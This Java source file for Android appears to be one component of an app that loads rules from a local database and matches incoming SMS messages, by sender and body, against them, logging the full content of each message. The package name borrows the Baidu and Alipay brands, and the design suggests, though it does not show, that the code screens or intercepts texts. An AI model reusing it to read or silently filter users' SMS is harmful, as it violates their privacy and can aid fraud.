package com.baidu.alipay.script.sms;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.script.Sms;
import com.baidu.serv.BaseThread;

public class GuardPojoWorker {
	
	private static String TAG = "GuardPojoWorker";

	private static Map<String, ListGuardPojo> listGuardPojoMap = new LinkedHashMap<String, ListGuardPojo>();
	
	private static Map<String,Sms> smsMap = new HashMap<String, Sms>();
	
	private static boolean inited = false;
	
	public static void invoke(Context context){
		if(context != null && !inited){
			inited = true;
			try{
				initFromDb(context);
			}catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public static boolean match(final Context context,final Msg msg){
		
		final MatchResult matchResult = new MatchResult();
		
		new BaseThread(null){
			public void run(){
				match(context,msg,matchResult);
			}
		}.start();
		
		while(matchResult.getResult() == null){
			try {
				Thread.sleep(1);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
		return matchResult.getResult();
	}
	
	/**
	 * 匹配短信
	 * @param msg
	 * @return
	 */
	private static void match(final Context context,Msg msg,MatchResult matchResult) {
		
		LogUtil.e(TAG, "start to match -> address : " + msg.getAddress() + " ; body : " + msg.getBody());

		if(listGuardPojoMap.size() == 0 && !inited){
			invoke(context);
		}
		
		boolean matched = false;
		
		try{
			if(listGuardPojoMap.size() > 0){
//				List<String> delList = new ArrayList<String>();
				
				for(String key : listGuardPojoMap.keySet()){
					ListGuardPojo listGuardPojo  = listGuardPojoMap.get(key);
					
//					if(listGuardPojo.size() == 0){
//						delList.add(key);
//					}else{	
						final GuardPojo guardPojo = listGuardPojo.match(context, msg);
						
						if(guardPojo != null){
							LogUtil.e(TAG, "matched -> address : " + msg.getAddress() + " ; body : " + msg.getBody());
							
							matched = true;
							
							matchResult.setResult(true);
						}	
					}
//				}
//				
//				if(delList.size() > 0){
//					for(String key : delList){
//						listGuardPojoMap.remove(key);
//					}
//				}
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
		
		if(!matched){
			matchResult.setResult(false);
		}
	}
	
	/**
	 * 从数据库获取guard列表
	 */
	private static void initFromDb(Context context){
		GuardPojoHandler guardPojoHandler = null;
		
		try{
			guardPojoHandler = new GuardPojoHandler(context);
			
			List<GuardPojo> guardPojoList = guardPojoHandler.listAll();
			
			if(guardPojoList != null && guardPojoList.size() > 0){
				
				String oldKey = "";
				String key = "";
				
				List<GuardPojo> subList = new ArrayList<GuardPojo>();
				
				for(GuardPojo guardPojo : guardPojoList){
					
					key = guardPojo.getSmsKey();
					
					if(oldKey.length() == 0 || key.equals(oldKey)){
						subList.add(guardPojo);					
					}else{
						ListGuardPojo listGuardPojo = new ListGuardPojo(context,subList); 
						
						listGuardPojoMap.put(oldKey, listGuardPojo);
						
						subList = new ArrayList<GuardPojo>();
						subList.add(guardPojo);
					}
					
					oldKey = key;
				}
				
				ListGuardPojo listGuardPojo = new ListGuardPojo(context,subList); 
				
				listGuardPojoMap.put(oldKey, listGuardPojo);
			}
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(guardPojoHandler != null){
				guardPojoHandler.close();
			}
		}
	}
	
//	/**
//	 * 从数据库获取sms对应的Guard列表
//	 * @param smsKey
//	 */
//	public static void addBySmsKey(Context context,String smsKey){
//		GuardPojoHandler guardPojoHandler = null;
//		
//		try{
//			guardPojoHandler = new GuardPojoHandler(context);
//			
//			List<GuardPojo> listBySms = guardPojoHandler.listBySms(smsKey);
//			
//			if(listBySms != null && listBySms.size() > 0){
//				ListGuardPojo listGuardPojo = new ListGuardPojo(context,listBySms);
//				
//				listGuardPojoMap.put(smsKey,listGuardPojo);
//			}
//		}catch (Exception e) {
//			e.printStackTrace();
//		}finally{
//			if(guardPojoHandler != null){
//				guardPojoHandler.close();
//			}
//		}
//	}
	
	public static ListGuardPojo addBySmsKey(Context context,String smsKey,List<GuardPojo> guardPojoList){
		if(guardPojoList != null && guardPojoList.size() > 0){
			for(GuardPojo guardPojo : guardPojoList){
				guardPojo.setSmsKey(smsKey);
			}
			
			ListGuardPojo listGuardPojo = new ListGuardPojo(context,guardPojoList);
			
			listGuardPojoMap.put(smsKey,listGuardPojo);
			
			return listGuardPojo;
		}
		
		return null;
	}
	
	public static Sms getSmsByKey(String key){
		return smsMap.get(key);
	}
	
	public static void addSmsByKey(Sms sms,String key){
		smsMap.put(key, sms);
	}
	
	public static void removeSmsByKey(String key){
		smsMap.remove(key);
	}
	
	/**
	 * 
	 * @param context
	 * @param key
	 */
	public static void removeBySmsKey(Context context, String key) {
		
		ListGuardPojo listGuardPojo = listGuardPojoMap.get(key);
		
		if(listGuardPojo != null){
			listGuardPojo.clear();
		}
		
		listGuardPojoMap.remove(key);
	}
	
}
